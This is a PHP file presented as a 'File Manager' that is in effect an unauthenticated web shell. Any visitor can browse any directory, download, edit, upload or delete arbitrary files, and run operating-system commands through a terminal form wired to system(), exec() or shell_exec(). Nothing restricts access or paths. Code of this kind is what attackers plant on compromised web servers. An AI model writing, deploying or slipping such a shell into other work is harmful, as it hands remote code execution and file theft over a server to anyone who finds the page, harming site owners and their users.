<?php
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = realpath($current_dir) ?: $current_dir;

// Handle file upload
if (isset($_FILES['uploaded_file'])) {
    $target = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES['uploaded_file']['name']);
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target)) {
        echo "<p style='color:lime;'>✅ Uploaded: " . htmlspecialchars($target) . "</p>";
    } else {
        echo "<p style='color:red;'>❌ Upload failed.</p>";
    }
}

// Handle file save (edit)
if (isset($_POST['save_file']) && isset($_POST['file_path']) && isset($_POST['file_content'])) {
    $save_path = $_POST['file_path'];
    if (file_put_contents($save_path, $_POST['file_content']) !== false) {
        echo "<p style='color:lime;'>✅ File saved: " . htmlspecialchars($save_path) . "</p>";
    } else {
        echo "<p style='color:red;'>❌ Save failed.</p>";
    }
}

// Handle file delete
if (isset($_GET['delete'])) {
    $del = $_GET['delete'];
    if (is_file($del) && unlink($del)) {
        echo "<p style='color:lime;'>✅ Deleted: " . htmlspecialchars($del) . "</p>";
    } else {
        echo "<p style='color:red;'>❌ Delete failed.</p>";
    }
}

// Handle file download
if (isset($_GET['download'])) {
    $dl = $_GET['download'];
    if (is_file($dl)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($dl) . '"');
        header('Content-Length: ' . filesize($dl));
        readfile($dl);
        exit;
    }
}

// Handle command execution
$cmd_output = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $cmd_output = ob_get_clean();
    } else if (function_exists('exec')) {
        exec($cmd, $output);
        $cmd_output = implode("\n", $output);
    } else if (function_exists('shell_exec')) {
        $cmd_output = shell_exec($cmd);
    } else {
        $cmd_output = "No command execution available.";
    }
}

function formatSize($bytes)
{
    if ($bytes >= 1073741824)
        return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576)
        return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024)
        return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function listDirectory($dir)
{
    echo "<h2>📁 ";

    $parts = explode(DIRECTORY_SEPARATOR, trim($dir, DIRECTORY_SEPARATOR));
    $currentPath = DIRECTORY_SEPARATOR;

    foreach ($parts as $part) {

        if ($part === '') {
            continue;
        }

        $currentPath .= $part . DIRECTORY_SEPARATOR;

        echo "<a href='?dir=" . urlencode(rtrim($currentPath, DIRECTORY_SEPARATOR)) . "' 
                style='color:#0f0;'>
                " . htmlspecialchars($part) . "
            </a>";

        echo " / ";
    }

    echo "</h2>";

    echo "<table border='1' cellpadding='4' style='border-collapse:collapse;width:100%;'>";
    echo "<tr style='background:#222;color:#fff;'>";
    echo "<th>Name</th>";
    echo "<th>Size</th>";
    echo "<th>Date Modified</th>";
    echo "<th>Actions</th>";
    echo "</tr>";

    $files = scandir($dir);

    foreach ($files as $file) {

        if ($file === '.' || $file === '..') {
            continue;
        }

        $path = $dir . DIRECTORY_SEPARATOR . $file;
        $is_dir = is_dir($path);
        $size = $is_dir ? '-' : formatSize(filesize($path));

        echo "<tr>";

        // FOLDER
        if ($is_dir) {

            echo "<td>";
            echo "<a href='?dir=" . urlencode($path) . "' style='color:#0f0;'>";
            echo "📁 " . htmlspecialchars($file);
            echo "</a>";
            echo "</td>";

            // FILE
        } else {

            echo "<td>";
            echo "📄 " . htmlspecialchars($file);
            echo "</td>";
        }

        $mtime = file_exists($path) ? date("Y-m-d H:i:s", filemtime($path)) : '-';
        echo "<td>$size</td>";
        echo "<td>$mtime</td>";

        echo "<td>";

        // FOLDER ACTION
        if ($is_dir) {

            echo "<a href='?dir=" . urlencode($path) . "'>";
            echo "📂 Open";
            echo "</a>";

            // FILE ACTIONS
        } else {

            echo "<a href='?download=" . urlencode($path) . "'>";
            echo "⬇️ Download";
            echo "</a> ";

            echo "<a href='?edit=" . urlencode($path) . "' style='color:cyan;'>";
            echo "✏️ Edit";
            echo "</a> ";

            echo "<a href='?delete=" . urlencode($path) . "' ";
            echo "onclick='return confirm(\"Delete " . htmlspecialchars($file) . "?\")' ";
            echo "style='color:red;'>";
            echo "🗑️ Delete";
            echo "</a>";
        }

        echo "</td>";
        echo "</tr>";
    }

    echo "</table>";
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>📁 File Manager</title>
    <style>
        body {
            background: #111;
            color: #eee;
            font-family: monospace;
            padding: 20px;
        }

        h1,
        h2 {
            color: #0f0;
        }

        table {
            border: 1px solid #444;
            width: 100%;
        }

        th,
        td {
            padding: 6px 10px;
            border: 1px solid #444;
        }

        tr:nth-child(even) {
            background: #1a1a1a;
        }

        a {
            color: #0af;
            text-decoration: none;
            margin-right: 6px;
        }

        a:hover {
            text-decoration: underline;
        }

        input[type=text],
        textarea,
        input[type=file] {
            background: #1a1a1a;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 6px;
            width: 100%;
            box-sizing: border-box;
        }

        button,
        input[type=submit] {
            background: #0f0;
            color: #000;
            padding: 6px 16px;
            border: none;
            cursor: pointer;
            font-weight: bold;
            margin-top: 6px;
        }

        button:hover {
            background: #0c0;
        }

        pre {
            background: #000;
            color: #0f0;
            padding: 10px;
            overflow-x: auto;
            white-space: pre-wrap;
        }

        .section {
            margin-top: 30px;
            border-top: 1px solid #333;
            padding-top: 20px;
        }

        .edit-cancel {
            color: orange;
            margin-left: 10px;
        }
    </style>
</head>

<body>


    <!-- Upload -->
    <div class="section">
        <h2>⬆️ Upload File</h2>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="uploaded_file">
            <input type="submit" value="Upload">
        </form>
    </div>

    <!-- Command Terminal -->
    <div class="section">
        <h2>💻 Command Terminal</h2>
        <form method="POST">
            <input type="text" name="cmd" placeholder="Enter command..."
                value="<?= htmlspecialchars($_POST['cmd'] ?? '') ?>">
            <button type="submit">▶ Run</button>
        </form>
        <?php if ($cmd_output): ?>
            <pre><?= htmlspecialchars($cmd_output) ?></pre>
        <?php endif; ?>
    </div>

    <!-- Edit File -->
    <?php if (isset($_GET['edit'])): ?>
        <?php
        $edit_path = $_GET['edit'];
        if (is_file($edit_path) && is_readable($edit_path)):
            $file_content = file_get_contents($edit_path);
            ?>
            <div class="section">
                <h2>✏️ Editing: <span style="color:#ff0;"><?= htmlspecialchars($edit_path) ?></span></h2>
                <form method="POST" action="">
                    <input type="hidden" name="file_path" value="<?= htmlspecialchars($edit_path) ?>">
                    <textarea name="file_content" rows="25"
                        style="font-family:monospace;font-size:13px;"><?= htmlspecialchars($file_content) ?></textarea>
                    <br>
                    <button type="submit" name="save_file" value="1">💾 Save</button>
                    <a href="?dir=<?= urlencode(dirname($edit_path)) ?>" class="edit-cancel">↩ Cancel</a>
                </form>
            </div>
        <?php else: ?>
            <p style="color:red;">❌ Cannot read file: <?= htmlspecialchars($edit_path) ?></p>
        <?php endif; ?>
    <?php endif; ?>
    <h1>🛠️ File Manager</h1>

    <?php listDirectory($current_dir); ?>
</body>

</html>